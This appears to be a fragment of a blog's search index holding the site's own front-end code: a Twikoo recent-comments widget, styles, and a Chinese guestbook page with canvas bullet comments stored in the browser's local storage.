return escapeHTML(s.trim()).replace(/\n/g, '<br>');  }  function formatTime(ts){    try { return new Date(ts).toLocaleString(); } catch(e){ return ''; }  }  async function resolveTitle(path){    if (!path) return '评论位置';    if (titleCache.has(path)) return titleCache.get(path);    const url = path.startsWith('http') ? path : (location.origin + path);    try {      const resp = await fetch(url, { credentials: 'omit' });      const html = await resp.text();      const m = html.match(/<title>(.*?)<\/title>/i);      let title = m ? m[1].trim() : '评论位置';      title = title.replace(/\s*\|\s*[^|]+$/, '');      titleCache.set(path, title);      return title;    } catch(e){      titleCache.set(path, '评论位置');      return '评论位置';    }  }  function render(items){    const container = document.getElementById('recent-comments');    if (!container) return;    const frag = document.createDocumentFragment();    items.forEach(e => {      const linkUrl = (e && e.url) ? (e.url + (e.id ? ('#' + e.id) : '')) : '#';      const wrapper = document.createElement('div');      wrapper.className = 'tk-comment';      wrapper.innerHTML = `        <div class=\"tk-avatar\">\n          <img src=\"${escapeHTML(e.avatar || '')}\" alt=\"avatar\">\n        </div>\n        <div class=\"tk-main\">\n          <div class=\"tk-header\">\n            <span class=\"tk-nick\">${escapeHTML(e.nick || '匿名')}</span>\n          </div>\n          <div class=\"tk-content\">${sanitizeContent(e.comment)}</div>\n          <div class=\"tk-footer\">\n            <span class=\"tk-time\">${formatTime(e.created)}</span>\n            <a class=\"tk-link\" href=\"${escapeHTML(linkUrl)}\" target=\"_blank\">评论位置</a>\n          </div>\n        </div>`;      frag.appendChild(wrapper);      resolveTitle(e.url).then(title => {        const a = wrapper.querySelector('.tk-link');        if (a) a.textContent = title || '评论位置';      });    });    container.innerHTML = '';    container.appendChild(frag);  }  async function refresh(){    try {      const Twikoo = window.twikoo;      if (!Twikoo || !Twikoo.getRecentComments) return;      // 拉取更多（最多 50 条），前端仅显示 displayedCount 条      const res = await Twikoo.getRecentComments({ envId, pageSize: 50 });      const list = (res || []).map(e => ({        avatar: e.avatar,        nick: e.nick,        comment: e.comment,        url: e.url,        id: e.id,        created: e.created      }));      fullList = list;      const countToShow = Math.min(displayedCount, fullList.length);      const container = document.getElementById('recent-comments');      const prevTop = container ? container.scrollTop : 0;      render(fullList.slice(0, countToShow));      if (container) container.scrollTop = prevTop;      updateLoadMoreState(displayedCount < fullList.length);    } catch(err){      console.warn('获取最新评论失败', err);    }  }  // 首次加载：等待 Twikoo 脚本就绪再刷新  const waitTwikoo = setInterval(() => {    if (window.twikoo && window.twikoo.getRecentComments) {      clearInterval(waitTwikoo);      refresh();    }  }, 500);  // 评论提交后 3 秒刷新：兼容按钮 id/class 两种情况  document.addEventListener('click', (e) => {    const t = e.target;    if (!t) return;    if (t.id === 'tk-submit' || t.classList.contains('tk-submit')) {      setTimeout(refresh, 3000);    }  });  // 轮询刷新，保持滚动区最新（保留当前滚动位置）  setInterval(async () => {    const c = document.getElementById('recent-comments');    const top = c ? c.scrollTop : 0;    await refresh();    if (c) c.scrollTop = top;  }, 10000);  // 加载更多（每次再显示 10 条更早的评论，使用 fullList，无需二次请求）  const loadMoreBtn = document.getElementById('load-more');  function updateLoadMoreState(hasMore){    if (!loadMoreBtn) return;    loadMoreBtn.disabled = !hasMore;    loadMoreBtn.textContent = hasMore ? '加载更多' : '没有更多了';  }  if (loadMoreBtn) {    loadMoreBtn.addEventListener('click', async () => {      if (isLoadingMore) return;      isLoadingMore = true;      try {        const newCount = Math.min(displayedCount + 10, fullList.length);        if (newCount === displayedCount) {          updateLoadMoreState(false);        } else {          const c = document.getElementById('recent-comments');          const top = c ? c.scrollTop : 0;          displayedCount = newCount;          render(fullList.slice(0, displayedCount));          if (c) c.scrollTop = top;          updateLoadMoreState(displayedCount < fullList.length);        }      } catch(err) {        console.warn('加载更多失败', err);      } finally {        isLoadingMore = false;      }    });  }})();</script><p style="margin-top:16px; font-weight: 600;">欢迎留言交流~ 下方可直接评论，提交后会显示在上方“最新评论”里。</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/html/css/try.css"/>
      <url>/html/css/try.css</url>
      
        <content type="html"><![CDATA[* {    margin: 0;    padding: 0;    box-sizing: border-box;}body {    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);    min-height: 100vh;    padding: 20px;}.container {    max-width: 1200px;    margin: 0 auto;    background: rgba(255, 255, 255, 0.95);    border-radius: 20px;    overflow: hidden;    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);}.header {    background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);    color: white;    padding: 40px;    text-align: center;}.header h1 {    font-size: 2.5rem;    margin-bottom: 10px;}.header p {    font-size: 1.2rem;    opacity: 0.9;}.content {    display: grid;    grid-template-columns: 1fr 1fr;    gap: 0;    min-height: 600px;}/* 留言板样式 */.comments-section {    padding: 30px;    background: white;    border-right: 1px solid #eee;}.comment-form {    background: #f8f9fa;    padding: 20px;    border-radius: 15px;    margin-bottom: 30px;}.form-group {    margin-bottom: 15px;}.form-group label {    display: block;    margin-bottom: 5px;    font-weight: 600;    color: #333;}.form-group input,.form-group textarea {    width: 100%;    padding: 12px;    border: 2px solid #e9ecef;    border-radius: 8px;    font-size: 14px;    transition: border-color 0.3s;}.form-group input:focus,.form-group textarea:focus {    outline: none;    border-color: #4facfe;}.submit-btn {    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);    color: white;    border: none;    padding: 12px 30px;    border-radius: 25px;    cursor: pointer;    font-size: 16px;    font-weight: 600;    transition: transform 0.3s;}.submit-btn:hover {    transform: translateY(-2px);}.comments-list {    max-height: 400px;    overflow-y: auto;}.comment-item {    background: white;    padding: 15px;    margin-bottom: 15px;    border-radius: 10px;    border-left: 4px solid #4facfe;    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);}.comment-header {    display: flex;    justify-content: space-between;    align-items: center;    margin-bottom: 8px;}.comment-author {    font-weight: bold;    color: #333;}.comment-time {    color: #666;    font-size: 12px;}.comment-content {    color: #555;    line-height: 1.5;}/* 弹幕区域样式 */.danmaku-section {    position: relative;    background: #1a1a1a;    overflow: hidden;}#danmakuCanvas {    position: absolute;    top: 0;    left: 0;    width: 100%;    height: 100%;}.danmaku-controls {    position: absolute;    bottom: 20px;    left: 0;    right: 0;    padding: 0 20px;    z-index: 10;}.danmaku-input {    display: flex;    gap: 10px;}.danmaku-input input {    flex: 1;    padding: 12px;    border: none;    border-radius: 25px;    background: rgba(255, 255, 255, 0.9);}.danmaku-send {    background: #ff4757;    color: white;    border: none;    padding: 12px 20px;    border-radius: 25px;    cursor: pointer;    font-weight: 600;}/* 响应式设计 */@media (max-width: 768px) {    .content {        grid-template-columns: 1fr;    }        .comments-section {        border-right: none;        border-bottom: 1px solid #eee;    }        .header h1 {        font-size: 2rem;    }        .header {        padding: 30px 20px;    }}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/html/try.html"/>
      <url>/html/try.html</url>
      
        <content type="html"><![CDATA[<!DOCTYPE html><html lang="zh-CN"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>留言板 - 弹幕互动</title>    <link rel="stylesheet" href="comments.css"></head><body>    <div class="container">        <div class="header">            <h1>💬 留言板 & 弹幕互动</h1>            <p>留下您的想法，参与实时弹幕互动</p>        </div>                <div class="content">            <!-- 留言板区域 -->            <div class="comments-section">                <div class="comment-form">                    <h3>发表留言</h3>                    <form id="commentForm">                        <div class="form-group">                            <label for="name">昵称</label>                            <input type="text" id="name" placeholder="请输入您的昵称" required>                        </div>                        <div class="form-group">                            <label for="email">邮箱</label>                            <input type="email" id="email" placeholder="请输入您的邮箱">                        </div>                        <div class="form-group">                            <label for="message">留言内容</label>                            <textarea id="message" rows="4" placeholder="请输入您的留言..." required></textarea>                        </div>                        <button type="submit" class="submit-btn">发布留言</button>                    </form>                </div>                                <div class="comments-list" id="commentsList">                    <!-- 留言列表将通过 JavaScript 动态生成 -->                </div>            </div>                        <!-- 弹幕区域 -->            <div class="danmaku-section">                <canvas id="danmakuCanvas"></canvas>                <div class="danmaku-controls">                    <div class="danmaku-input">                        <input type="text" id="danmakuInput" placeholder="输入弹幕内容..." maxlength="30">                        <button class="danmaku-send" onclick="sendDanmaku()">发射</button>                    </div>                </div>            </div>        </div>    </div>    <script src="comments.js"></script></body></html>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>留言板</title>
      <link href="/try/index.html"/>
      <url>/try/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" href="/comments/comments.css"><div class="container">    <!-- 这里粘贴上面的HTML内容 -->    <!DOCTYPE html><html lang="zh-CN"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>留言板 - 弹幕互动</title>    <link rel="stylesheet" href="comments.css"></head><body>    <div class="container">        <div class="header">            <h1>💬 留言板 & 弹幕互动</h1>            <p>留下您的想法，参与实时弹幕互动</p>        </div><pre><code>    &lt;div class=&quot;content&quot;&gt;        &lt;!-- 留言板区域 --&gt;        &lt;div class=&quot;comments-section&quot;&gt;            &lt;div class=&quot;comment-form&quot;&gt;                &lt;h3&gt;发表留言&lt;/h3&gt;                &lt;form id=&quot;commentForm&quot;&gt;                    &lt;div class=&quot;form-group&quot;&gt;                        &lt;label for=&quot;name&quot;&gt;昵称&lt;/label&gt;                        &lt;input type=&quot;text&quot; id=&quot;name&quot; placeholder=&quot;请输入您的昵称&quot; required&gt;                    &lt;/div&gt;                    &lt;div class=&quot;form-group&quot;&gt;                        &lt;label for=&quot;email&quot;&gt;邮箱&lt;/label&gt;                        &lt;input type=&quot;email&quot; id=&quot;email&quot; placeholder=&quot;请输入您的邮箱&quot;&gt;                    &lt;/div&gt;                    &lt;div class=&quot;form-group&quot;&gt;                        &lt;label for=&quot;message&quot;&gt;留言内容&lt;/label&gt;                        &lt;textarea id=&quot;message&quot; rows=&quot;4&quot; placeholder=&quot;请输入您的留言...&quot; required&gt;&lt;/textarea&gt;                    &lt;/div&gt;                    &lt;button type=&quot;submit&quot; class=&quot;submit-btn&quot;&gt;发布留言&lt;/button&gt;                &lt;/form&gt;            &lt;/div&gt;                        &lt;div class=&quot;comments-list&quot; id=&quot;commentsList&quot;&gt;                &lt;!-- 留言列表将通过 JavaScript 动态生成 --&gt;            &lt;/div&gt;        &lt;/div&gt;                &lt;!-- 弹幕区域 --&gt;        &lt;div class=&quot;danmaku-section&quot;&gt;            &lt;canvas id=&quot;danmakuCanvas&quot;&gt;&lt;/canvas&gt;            &lt;div class=&quot;danmaku-controls&quot;&gt;                &lt;div class=&quot;danmaku-input&quot;&gt;                    &lt;input type=&quot;text&quot; id=&quot;danmakuInput&quot; placeholder=&quot;输入弹幕内容...&quot; maxlength=&quot;30&quot;&gt;                    &lt;button class=&quot;danmaku-send&quot; onclick=&quot;sendDanmaku()&quot;&gt;发射&lt;/button&gt;                &lt;/div&gt;            &lt;/div&gt;        &lt;/div&gt;    &lt;/div&gt;&lt;/div&gt;&lt;script src=&quot;comments.js&quot;&gt;&lt;/script&gt;</code></pre></body></html></div><script src="/comments/comments.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/html/js/try.js"/>
      <url>/html/js/try.js</url>
      
        <content type="html"><![CDATA[// 留言板功能const commentForm = document.getElementById('commentForm');const commentsList = document.getElementById('commentsList');// 从 localStorage 加载留言function loadComments() {    const comments = JSON.parse(localStorage.getItem('comments')) || [];    commentsList.innerHTML = '';        comments.forEach(comment => {        const commentElement = document.createElement('div');        commentElement.className = 'comment-item';        commentElement.innerHTML = `            <div class="comment-header">                <span class="comment-author">${comment.name}</span>                <span class="comment-time">${comment.time}</span>            </div>            <div class="comment-content">${comment.message}</div>        `;        commentsList.appendChild(commentElement);    });}// 提交留言commentForm.addEventListener('submit', function(e) {    e.preventDefault();        const name = document.getElementById('name').value;    const email = document.getElementById('email').value;    const message = document.getElementById('message').value;        const comment = {        name: name,        email: email,        message: message,        time: new Date().toLocaleString('zh-CN')    };        // 保存到 localStorage    const comments = JSON.parse(localStorage.getItem('comments')) || [];    comments.unshift(comment);    localStorage.setItem('comments', JSON.stringify(comments));        // 清空表单    commentForm.reset();        // 重新加载留言    loadComments();        // 同时发送弹幕    sendDanmaku(message, name);});// 弹幕功能const canvas = document.getElementById('danmakuCanvas');const ctx = canvas.getContext('2d');let danmakus = [];// 初始化画布function initCanvas() {    canvas.width = canvas.offsetWidth;    canvas.height = canvas.offsetHeight;}// 弹幕类class Danmaku {    constructor(text, color = '#fff') {        this.text = text;        this.color = color;        this.x = canvas.width;        this.y = Math.random() * (canvas.height - 50) + 25;        this.speed = 2 + Math.random() * 2;        this.opacity = 1;        this.fontSize = 18 + Math.random() * 10;    }        update() {        this.x -= this.speed;        return this.x > -200;    }        draw() {        ctx.save();        ctx.globalAlpha = this.opacity;        ctx.font = `bold ${this.fontSize}px Arial`;        ctx.fillStyle = this.color;        ctx.fillText(this.text, this.x, this.y);                // 添加文字阴影        ctx.shadowColor = 'rgba(0, 0, 0, 0.8)';        ctx.shadowBlur = 10;        ctx.shadowOffsetX = 2;        ctx.shadowOffsetY = 2;        ctx.restore();    }}// 发送弹幕function sendDanmaku(text = null, author = null) {    const input = document.getElementById('danmakuInput');    const danmakuText = text || input.value;        if (danmakuText.trim()) {        const colors = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#feca57', '#ff9ff3'];        const color = colors[Math.floor(Math.random() * colors.length)];                let displayText = danmakuText;        if (author && !text) {            displayText = `${author}: ${danmakuText}`;        }                danmakus.push(new Danmaku(displayText, color));                if (!text) {            input.value = '';        }    }}// 动画循环function animate() {    ctx.clearRect(0, 0, canvas.width, canvas.height);        // 更新和绘制所有弹幕    danmakus = danmakus.filter(danmaku => danmaku.update());    danmakus.forEach(danmaku => danmaku.draw());        requestAnimationFrame(animate);}// 初始化window.addEventListener('load', function() {    initCanvas();    loadComments();    animate();        // 添加一些示例弹幕    setTimeout(() => {        sendDanmaku('欢迎来到留言板！');        sendDanmaku('这个页面真不错~');        sendDanmaku('大家快来留言呀！');        sendDanmaku('弹幕效果很酷！');        sendDanmaku('支持实时互动！');    }, 1000);});window.addEventListener('resize', initCanvas);// 回车发送弹幕document.getElementById('danmakuInput').addEventListener('keypress', function(e) {    if (e.key === 'Enter') {        sendDanmaku();    }});// 添加随机弹幕生成（可选）setInterval(() => {    const randomMessages = [        '这个留言板很棒！',        '弹幕效果很流畅',        '界面设计很漂亮',        '功能很实用',        '支持实时互动',        '用户体验很好'    ];    const randomMessage = randomMessages[Math.floor(Math.random() * randomMessages.length)];    sendDanmaku(randomMessage);}, 10000); // 每10秒发送一条随机弹幕]]></content>
      
    </entry>
    
    
  
</search>
